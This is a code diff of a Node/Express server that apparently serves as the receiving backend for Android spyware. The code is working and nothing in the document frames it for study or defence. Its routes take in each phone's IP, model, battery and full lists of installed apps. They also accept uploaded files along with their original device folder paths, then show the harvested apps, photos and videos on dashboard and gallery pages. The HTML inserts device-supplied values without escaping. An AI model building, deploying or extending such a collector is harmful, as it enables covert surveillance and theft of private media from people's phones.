@@ -53,13 +53,13 @@ function saveLog(data) {
 function parseBody(body) {
   const obj = {};
   body.split("&").forEach(pair => {
-    const [key, value] = pair.split("=");
-    if (key && value) obj[key] = decodeURIComponent(value);
+    const [k, v] = pair.split("=");
+    if (k && v) obj[k] = decodeURIComponent(v);
   });
   return obj;
 }
 
-/* ================= CONFIG CONTROL ================= */
+/* ================= CONFIG ================= */
 
 app.get('/config', (req, res) => {
   const cfg = loadConfig();
@@ -107,7 +107,7 @@ app.post('/track', (req, res) => {
       time: new Date().toISOString()
     };
 
-    // 🔥 Advanced Console Log (clean)
+    // 🔥 Clean console log
     console.log("\n📱 DEVICE =====================");
     console.log(`IP: ${data.ip} | ${data.brand} ${data.model} | Android ${data.android}`);
     console.log(`Battery: ${data.battery}% | Apps: ${data.app_count} (User: ${userApps.length}, System: ${systemApps.length})`);
@@ -128,54 +128,39 @@ app.post('/upload', (req, res) => {
   }
 
   let fileName = "file.bin";
-let folder = "unknown";
-
-if (req.query.name) {
-  try {
-    const decoded = decodeURIComponent(req.query.name);
-
-    // full path
-    folder = path.dirname(decoded);
-
-    // original file name
-    fileName = path.basename(decoded);
-
-  } catch {}
-}
-  let original = "file.bin";
+  let folder = "unknown";
 
   if (req.query.name) {
     try {
       const decoded = decodeURIComponent(req.query.name);
-      original = path.basename(decoded);
+      folder = path.dirname(decoded);
+      fileName = path.basename(decoded);
     } catch {}
   }
 
-  const ext = path.extname(original);
-  fileName += ext || ".bin";
+  // prevent overwrite
+  const safeName = Date.now() + "_" + fileName;
+  const filePath = path.join(UPLOAD_DIR, safeName);
 
-  const filePath = path.join(UPLOAD_DIR, fileName);
-
-  // 🔥 Clean log
   console.log("\n📦 FILE RECEIVED =====================");
-console.log(`Path: ${folder}`);
-console.log(`File: ${fileName}`);
-console.log("======================================");
+  console.log(`Path: ${folder}`);
+  console.log(`File: ${fileName}`);
+  console.log("======================================");
 
   const stream = fs.createWriteStream(filePath);
   req.pipe(stream);
-
-  stream.on('error', () => console.log("Write error"));
 
   req.on('end', () => {
 
     saveLog({
       type: "file",
-      file: fileName,
+      file: safeName,
+      original: fileName,
+      folder: folder,
       time: new Date().toISOString()
     });
 
-    res.json({ status: "uploaded", file: fileName });
+    res.json({ status: "uploaded", file: safeName });
   });
 
   req.on('error', () => {
@@ -197,82 +182,33 @@ app.get('/users', (req, res) => {
   const devices = logs.filter(x => x.type === "device");
 
   const unique = {};
-
-  devices.forEach(log => {
-    if (!log.ip || !log.model) return;
-    const key = log.ip + "_" + log.model;
-    unique[key] = log;
+  devices.forEach(d => {
+    if (!d.ip || !d.model) return;
+    unique[d.ip + "_" + d.model] = d;
   });
 
   const list = Object.values(unique);
 
-  let html = `
-  <html>
-  <head>
-    <style>
-      body { background:#111; color:#fff; font-family:sans-serif; }
-      .card { border:1px solid #333; padding:15px; margin:10px; border-radius:10px; }
-      .apps { max-height:200px; overflow:auto; background:#000; padding:10px; margin-top:5px; }
-      .apps div { font-size:12px; border-bottom:1px solid #222; padding:2px; }
-      .title { margin-top:10px; font-weight:bold; }
-    </style>
-  </head>
-  <body>
-    <h2>Total Devices: ${list.length}</h2>
-  `;
+  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
 
-  list.reverse().forEach(user => {
-
+  list.reverse().forEach(u => {
     html += `
-    <div class="card">
-      <b>IP:</b> ${user.ip}<br>
-      <b>Device:</b> ${user.brand} ${user.model}<br>
-      <b>Android:</b> ${user.android}<br>
-      <b>Battery:</b> ${user.battery}<br>
-      <b>Total Apps:</b> ${user.app_count}<br>
+    <div style="border:1px solid #333;padding:10px;margin:10px">
+      <b>${u.brand} ${u.model}</b><br>
+      IP: ${u.ip}<br>
+      Battery: ${u.battery}<br>
+      Apps: ${u.app_count}<br>
 
-      <div class="title">📱 User Apps (${user.user_apps?.length || 0})</div>
-      <div class="apps">
-        ${(user.user_apps || []).map(a => `<div>${a}</div>`).join("")}
-      </div>
+      <h4>User Apps</h4>
+      ${(u.user_apps || []).map(a => `<div>${a}</div>`).join("")}
 
-      <div class="title">⚙️ System Apps (${user.system_apps?.length || 0})</div>
-      <div class="apps">
-        ${(user.system_apps || []).map(a => `<div>${a}</div>`).join("")}
-      </div>
+      <h4>System Apps</h4>
+      ${(u.system_apps || []).map(a => `<div>${a}</div>`).join("")}
     </div>
     `;
   });
 
   html += "</body></html>";
-
-  res.send(html);
-});
-
-/* ================= LOGS ================= */
-
-app.get('/logs', (req, res) => {
-
-  if (!fs.existsSync(LOG_FILE)) return res.send("No logs");
-
-  const logs = fs.readFileSync(LOG_FILE, "utf-8")
-    .split("\n")
-    .filter(Boolean)
-    .map(x => JSON.parse(x));
-
-  const ordered = [
-    ...logs.filter(x => x.type === "device"),
-    ...logs.filter(x => x.type === "file")
-  ];
-
-  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
-
-  ordered.reverse().forEach(l => {
-    html += `<pre>${JSON.stringify(l, null, 2)}</pre><hr>`;
-  });
-
-  html += "</body></html>";
-
   res.send(html);
 });
 
@@ -289,58 +225,45 @@ app.get('/gallery', (req, res) => {
 
   const files = logs.filter(x => x.type === "file");
 
-  // group by folder
   const grouped = {};
 
   files.forEach(f => {
     const key = f.folder || "unknown";
     if (!grouped[key]) grouped[key] = [];
-    grouped[key].push(f.file);
+    grouped[key].push(f);
   });
 
-  let html = `
-  <html>
-  <head>
-    <style>
-      body { background:#111; color:#fff; font-family:sans-serif; }
-      .section { margin:20px 0; }
-      .title { font-size:16px; margin:10px 0; color:#0af; }
-      .grid { display:flex; flex-wrap:wrap; }
-      .card { margin:10px; width:200px; }
-      img, video { width:100%; border-radius:10px; }
-    </style>
-  </head>
-  <body>
-    <h2>📁 Gallery (Grouped by Path)</h2>
-  `;
+  let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
 
   Object.keys(grouped).forEach(folder => {
 
-    html += `<div class="section">`;
-    html += `<div class="title">📂 ${folder}</div>`;
-    html += `<div class="grid">`;
+    html += `<h3>📂 ${folder}</h3><div style="display:flex;flex-wrap:wrap">`;
 
-    grouped[folder].reverse().forEach(file => {
+    grouped[folder].reverse().forEach(f => {
 
-      const url = `/uploads/${file}`;
+      const url = `/uploads/${f.file}`;
 
-      if (file.endsWith(".jpg") || file.endsWith(".png")) {
-        html += `<div class="card"><img src="${url}" /></div>`;
-      } else if (file.endsWith(".mp4")) {
-        html += `<div class="card"><video src="${url}" controls></video></div>`;
+      if (f.file.endsWith(".jpg") || f.file.endsWith(".png")) {
+        html += `<img src="${url}" width="200" style="margin:5px">`;
+      } else if (f.file.endsWith(".mp4")) {
+        html += `<video src="${url}" controls width="200" style="margin:5px"></video>`;
       } else {
-        html += `<div class="card"><a href="${url}">${file}</a></div>`;
+        html += `<a href="${url}">${f.original}</a>`;
       }
 
     });
 
-    html += `</div></div>`;
+    html += `</div>`;
   });
 
   html += "</body></html>";
-
   res.send(html);
 });
+
+/* ================= STATIC ================= */
+
+app.use('/uploads', express.static(UPLOAD_DIR));
+
 /* ================= START ================= */
 
 const PORT = process.env.PORT || 3000;
